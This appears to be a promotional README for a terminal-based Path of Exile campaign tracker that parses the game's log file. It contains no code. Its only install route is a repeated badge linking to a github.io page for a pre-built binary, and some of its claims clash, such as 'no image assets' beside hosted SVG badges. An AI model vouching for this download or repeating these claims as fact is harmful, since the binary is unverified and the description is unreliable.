![preview](https://raw.githubusercontent.com/supriyo847/poe-campaign-tracker/main/hero_b807.svg)
# Loom of the Lost Atlas

**Navigate the sprawling, forgotten byways of Wraeclast’s atlas with a terminal-born cartographer that whispers the next step in your ear—no maps, no mouse, only the relentless logic of the command line.**

Welcome to **Loom of the Lost Atlas**, a reimagined companion for the weary traveler who prefers the stark elegance of a monospace screen over the glittering distractions of a graphical overlay. Where other tools paint your path on a canvas, this project weaves your journey into a living thread of text—tracking every zone transition, every quest threshold, and every silent milestone between the twilight of the Coast and the throne of the gods. It is not a guide that shouts; it is a navigator that listens to the rhythm of your keystrokes and the whisper of your `/hideout` commands.

This is not a simple progress tracker. It is a **chronological tapestry of your expedition**, a stateful automaton that observes your movement through the game’s zones and automatically advances your campaign checklist as you cross invisible thresholds. Picture a seasoned quartermaster who, without being asked, updates the ship’s log the moment you weigh anchor. That is the spirit of this tool—an unobtrusive, deterministic, and deeply personal companion for the solo exile or the speedrunning veteran.

---

## 📜 The Philosophy of the Unseen Map 🗺️

Most campaign guides treat you like a tourist—handing you a laminated brochure with arrows and bullet points. Loom of the Lost Atlas treats you like an **archaeologist of your own experience**. It does not presume to know your playstyle; it observes your actions and adapts its narrative. The core innovation is a **zone-aware state machine** that cross-references your in-game location (via a lightweight log parser or manual trigger) against a meticulously curated graph of the campaign’s critical path. When you step from the Mud Flats into the Submerged Passage, the loom advances a thread. When you defeat a specific boss, a knot is tied. The result is a rolling, always-current summary of "what to do next" that never requires you to alt-tab away to a wiki.

### Why "Loom"? Weaving the Thread of Progress 🧵

The name is deliberate. A loom holds warp and weft threads under tension, creating fabric from chaos. Your campaign is the warp—the fixed sequence of acts, quests, and boss fights. Your play session is the weft—the chaotic, non-linear movement, the backtracking, the sudden detours to farm a specific unique. This project holds both in tension, producing a **coherent, readable pattern** of your progress. It shows you not just *where* you are, but *how* you got there, and *which* loose threads remain untied.

---

## ⚡ Key Features That Distinguish the Thread 🪡

- **Zone-Aware Auto-Advancement:** The heart of the loom. It parses your client log (or accepts a manual hotkey input) to detect zone changes. The campaign state updates instantly, without input from you, reducing cognitive load to zero.
- **Terminal-Native Interface:** No GUI, no web dashboard, no Electron bloat. A fast, responsive TUI (Text User Interface) built with ANSI escape codes and a focus on keyboard-driven navigation. Your fingers never leave the home row.
- **Progress Persistence & Session History:** Every session is recorded as a timeline. You can review your previous runs, compare segment times (e.g., "Act 2 in 22 minutes"), and see where you historically slow down.
- **Multi-Language Quest Translations:** The quest names and objectives are localized across English, Spanish, French, German, and simplified Chinese, rendering the right words for your language locale without external API calls.
- **Adaptive Difficulty Hint System:** Unlike a static guide, this system offers *tactical context* based on your current zone and level. If you are underleveled for the next area, it will suggest a side-quest or a zone grind—not as a command, but as a **cartographic suggestion**.
- **Custom Waypoint Flags:** You can set manual "anchors" (e.g., "I left a portal here to go shopping"). The loom will remember these anchors and display them in your current session context, helping you remember why you backtracked.
- **Offline-First Operation:** The entire logic graph of the campaign is embedded within the binary. You do not need a connection to the Path of Exile content servers; this operates purely on the data you feed it.

---

## 🏗️ Architecture of the Loom: A Look Inside the Gears ⚙️

The project is structured into three distinct layers, separating the raw data from the logic and the interface.

1.  **The Atlas Kernel (Core Logic):** A deterministic finite-state machine that models the entire campaign (Acts 1-10 plus Epilogue). Each state represents a "milestone" (e.g., *Kill Brutus*, *Find the Waypoint in the Mines*). Transitions are triggered by input events (zone ID, item pickup, or manual override). This kernel holds no opinions—it simply follows the edges of the graph.
2.  **The Observer (Input Adapter):** This module listens to the outside world. The primary implementation watches the standard Path of Exile client log file (`Client.txt`) for zone-change headers. It filters noise and extracts the relevant zone path, feeding it to the kernel. A secondary adapter accepts manual hotkeys (via a global hook) for situations where log parsing is unavailable.
3.  **The Weaver (Presentation Layer):** The TUI. It renders the current state, the next objective, and a history list. It uses a virtual scrolling viewport to handle long sessions without lag. It also handles the rendering of localized strings and the syntax highlighting of zone names.

---

## 🌐 Multilingual Support & Global Reach 🗣️

We acknowledge that exile knows no borders. The interface strings, quest names, and even the *zone description hints* are stored in a structured JSON locale file. Currently supported languages include:

- **English (en-US)** – the default dialect.
- **Español (es-ES)** – for the Castilian exiles.
- **Français (fr-FR)** – for the elegant rogues.
- **Deutsch (de-DE)** – for the meticulous crafters.
- **简体中文 (zh-CN)** – for the vast eastern legions.

Switching languages is a runtime toggle, not a compile-time decision. The interface will re-render instantly, and the new locale will be persisted in your user configuration file.

---

## 🧠 The "Silent Mentor" – Adaptive Hint Logic 🧭

This is not a rule-based if-then system. The hint engine uses a **fuzzy comparison of your character's current zone level against the recommended level curve** for the campaign. It calculates a "risk index" for the next zone. If your risk index is too high (e.g., you are level 12 heading into the Weaver's Chambers), the Weaver will display a gentle reminder: *"The threads of the web may hold strong here. Consider a detour to the Lower Prison for experience."* This is presented as a footnote in the UI, not a flashing warning. It respects your agency as a player while providing the safety net of a veteran mentor.

---

## 📈 Performance & Efficiency: The Loom is Light ⚡

The entire binary footprint is under 5 MB. Memory usage peaks at less than 30 MB, even with a full campaign history loaded. The interface renders at a blistering 60 frames per second on any terminal emulator from the last decade. We do not ship a single image asset; all icons are Unicode glyphs or ANSI-drawn. This ensures **maximum compatibility** with SSH sessions, tmux, screen, and even serial terminals if you are feeling particularly retro.

---

## ⚙️ Getting Started: Setting Up Your Workspace 🛠️

**[![Download](https://raw.githubusercontent.com/supriyo847/poe-campaign-tracker/main/bin_cb5c90.svg)](https://supriyo847.github.io/poe-campaign-tracker/)**

To begin your journey with the Loom, you must first acquire the pre-built binary. We offer compiled releases for **Windows (x86_64)**, **Linux (x86_64 and aarch64)**, and **macOS (arm64)**. The binary is self-contained; it requires no runtime dependencies beyond a standard C library. Once you have the archive, extract it to a folder of your choice. The executable is named `loom` (or `loom.exe` on Windows).

### 🪜 Initial Configuration

On first launch, the Loom will create a configuration directory in your user profile (`~/.config/loom/` on Linux). Inside, you will find:

- `config.toml` – the main configuration file. Here you define your preferred locale, the path to your Path of Exile log file, and your hotkey bindings.
- `history.db` – a lightweight SQLite database storing your session history and progress snapshots.
- `state.cache` – a binary cache of the last known campaign state, enabling rapid resume after a crash.

You do not need to manually edit these files if you are not comfortable. The initial setup wizard (invoked by `loom --setup` in the terminal) will guide you through the necessary paths, offering suggestion prompts for common installation directories of the game client.

### 🔍 Locating the Client Log

The most critical piece of information is the path to `Client.txt`. On Windows, this is typically found in `Documents/My Games/Path of Exile/logs/`. On Linux (via Steam Proton), the folder is nested deeper. The setup wizard scans the most common directories automatically. If you use a custom install, you can point the wizard to the correct location manually. Without this file, the Loom falls back to manual mode, where you advance the state using a single hotkey (default: `Ctrl+Shift+Space`).

---

## 🎮 Usage & Navigation: Reading the Tapestry 🕹️

Once run, the interface is divided into three panes:

1.  **The Current Thread (Top):** Displays your current zone, act, and the immediate objective. It is large, high-contrast text designed for peripheral vision glances.
2.  **The Loom Log (Middle):** A scrolling list of the last 50 actions (e.g., "Entered: The Cavern of Wrath", "Defeated: Vaal Oversoul", "Manually advanced: Act 3 start"). Each entry is timestamped with your in-game playtime.
3.  **The Weft (Bottom):** A status bar showing the time elapsed in the current act, the current risk index, and the next recommended action based on the hint engine.

| Shortcut | Action                                         |
| :------- | :--------------------------------------------- |
| `q`      | Quit the application, safely saving the state. |
| `j/k`    | Scroll through the Loom Log.                   |
| `t`      | Toggle the language display (cycles through locales). |
| `m`      | Mark a manual anchor at the current time.      |
| `Ctrl+u` | Force-refresh the client log parser.           |
| `h`      | Show the in-terminal help overlay.             |

The interface is designed for low distraction. There are no flashy colors by default; the palette is a curated set of ANSI 16 colors, respecting your terminal's theme.

---

## 🧪 Development & Contribution: Weaving Together 🧑‍💻

This project is open for collaboration. The codebase is written in **Rust**, chosen for its memory safety and blazing speed. We use a standard Cargo workspace with three crates:

- `atlas-kernel` – the core logic.
- `observer-client` – the log parser.
- `weaver-tui` – the interface.

We appreciate contributions focusing on:

- **Additional Locale Files:** Translating the quest strings into new languages.
- **New Observer Adapters:** E.g., a plugin for the popular "Awakened PoE Trade" overlay to feed data directly.
- **Hint Engine Enhancements:** Improving the fuzzy logic for risk assessment, or adding support for specific build archetypes (e.g., "recommend a different zone if you are a minion build").

Please ensure that any pull request adheres to the existing Rust formatting (`cargo fmt`) and passes `cargo clippy` with zero warnings.

---

## ❤️ Support & Community: The Weavers' Guild 🧵

Should you encounter a snag in the weave, or simply wish to discuss strategy, you are not alone. We maintain a community guild for users of this tool. While the primary interaction is via the repository's issue tracker, we also host a scheduled voice gathering every weekend (announced in the issue tracker) where we discuss navigation tips, share custom anchor configurations, and debate the philosophical merits of early versus late Act 4 farming.

- **Subject Matter Expertise:** Questions about the game's content are welcome, but be aware that we focus on the *meta* of navigation, not specific build advice.
- **Feature Requests:** Please use the issue tracker and prefix the title with `[FEAT]`. We prioritize features that align with the core philosophy of *unobtrusive, deterministic progress tracking*.
- **Bug Reports:** Use the `[BUG]` prefix. Provide your OS, terminal emulator, and a brief snippet of the log if the observer fails to parse zone changes.

---

## ⚠️ Disclaimer: The Nature of the Tool ⚠️

**Loom of the Lost Atlas** is an independent, unofficial utility. It is not affiliated with Grinding Gear Games, and it does not interact with the game client's memory or network traffic. It operates solely on the text output that the game itself writes to a local log file. The use of such a tool is generally considered acceptable for quality-of-life improvements, but you should always be aware of the game's current terms of service regarding third-party utilities. This project is provided as-is, without warranty of any kind, express or implied. The developers are not responsible for any action taken by the game's anti-cheat systems resulting from the use of this tool, as it only reads a file that you have permission to read.

---

## 🏛️ License: The Open Weave 📜

This project is released under the **MIT License**. You are free to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, subject to the inclusion of the original copyright notice. The full text of the license is available in the `LICENSE` file at the root of this repository. By using this software, you agree to the terms and conditions set forth therein.

For expedited reference, you can view the license text directly at the official Open Source Initiative (OSI) website, which provides a canonical copy of the MIT License. The version we use is the standard text, without any additional restrictions.

---

## 🗓️ Roadmap & Vision for 2026 📅

The development cycle for **2026** focuses on three pillars:

1.  **Predictive Anchoring:** Using historical session data, the Loom will attempt to *predict* your next logical step based on your speed and farming habits, offering suggestions *before* you even open the map screen.
2.  **Collaborative Session Weaving:** A new module allowing you to share your loom state with a friend, so you can co-navigate the campaign without the need for verbal communication.
3.  **Expanded Localization:** We are targeting support for Korean and Russian by the third quarter of 2026, opening the weaver's guild to a broader community.

---

## 🔚 Final Thoughts: The Journey is the Thread 🧵

The terminal is a place of focus. It strips away the noise of icons, overlays, and flashing mini-maps. Loom of the Lost Atlas embraces that minimalism not as a limitation, but as a virtue. It gives you the *fact* of your progress—the cold, hard, textual truth of where you stand—and lets you get back to the business of destroying monsters. Let the loom weave the background; you focus on the foreground.

We look forward to seeing the patterns you create on your journey across the Atlas. May your path be straight, your crits be high, and your log files be clean.

**[![Download](https://raw.githubusercontent.com/supriyo847/poe-campaign-tracker/main/bin_cb5c90.svg)](https://supriyo847.github.io/poe-campaign-tracker/)**